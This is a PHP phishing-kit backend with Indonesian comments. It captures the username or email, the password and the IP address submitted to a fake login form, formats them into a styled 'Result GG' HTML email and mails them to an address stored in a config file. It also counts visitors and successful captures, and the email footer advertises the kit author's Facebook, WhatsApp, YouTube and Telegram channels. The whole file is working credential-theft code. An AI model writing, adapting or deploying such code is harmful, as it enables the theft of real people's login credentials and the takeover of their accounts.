<?php

// MENANGKAP DATA YG DI INPUT
$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];

// KONTEN RESULT AKUN
$subjek = "Result GG | $user ";
$pesan = '
<center>
 <div style="background: url(https://i.postimg.cc/8CdpSpMk/IMG-20220525-WA0090.jpg) no-repeat;border:2px solid white;background-size: 100% 100%; width: 294; height: 101px; color: #996633; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:#996633;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Phone</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>IP</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$ip.'</th> 
</tr>
</table>
<div style="border:2px solid white;width: 294; font-weight:bold; height: 20px; background: #996633; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#3399ff;" href="https://www.facebook.com/nextnesia">Facebook</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#00ff00;" href="https://wa.me/6281332412122">Whatsapp</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#ff0000;" href="https://www.youtube.com/wahyuekaprayogayt">Youtube</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0AC2F9;" href="https://t.me/nextnesiasc">Telegram</a>
</div>
 <center>

';

// TODAY
$Tget = file_get_contents("etc/visitor.json");
$Tdecode = json_decode($Tget,true);
$today = $Tdecode['today'] + 1;
$Tdecode['today'] = $today;
$Tresult = json_encode($Tdecode);
            $Tfile = fopen('etc/visitor.json','w');
                     fwrite($Tfile,$Tresult);
                     fclose($Tfile);
                     
// YESTERDAY
if(date("H:i") == "01:00"){
$Yget = file_get_contents("etc/visitor.json");
$Ydecode = json_decode($Yget,true);
$Ydecode['yesterday'] = $Ydecode['today'];
$Ydecode['today'] = 0;
$Yresult = json_encode($Ydecode);
            $Yfile = fopen('etc/visitor.json','w');
                     fwrite($Yfile,$Yresult);
                     fclose($Yfile);
}

// ALL OVER
$Aget = file_get_contents("etc/visitor.json");
$Adecode = json_decode($Aget,true);
$all = $Adecode['total'] + 1;
$Adecode['total'] = $all;
$Aresult = json_encode($Adecode);
            $Afile = fopen('etc/visitor.json','w');
                     fwrite($Afile,$Aresult);
                     fclose($Afile);

// RESULT DATA
$resultGet = file_get_contents("etc/data.json");
$resultData = json_decode($resultGet,true);

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$resultData['nama'].' <claretianoputra22@gmail.com>' . "\r\n";

if(mail($resultData['email'], $subjek, $pesan, $headers))
{
$upGet = file_get_contents("etc/data.json");
$upData = json_decode($upGet,true);
$hasil = $upData['totals'] + 1;
$upData['totals'] = $hasil;
$upResult = json_encode($upData);
$upFile = fopen('etc/data.json','w');
          fwrite($upFile,$upResult);
          fclose($upFile);
}

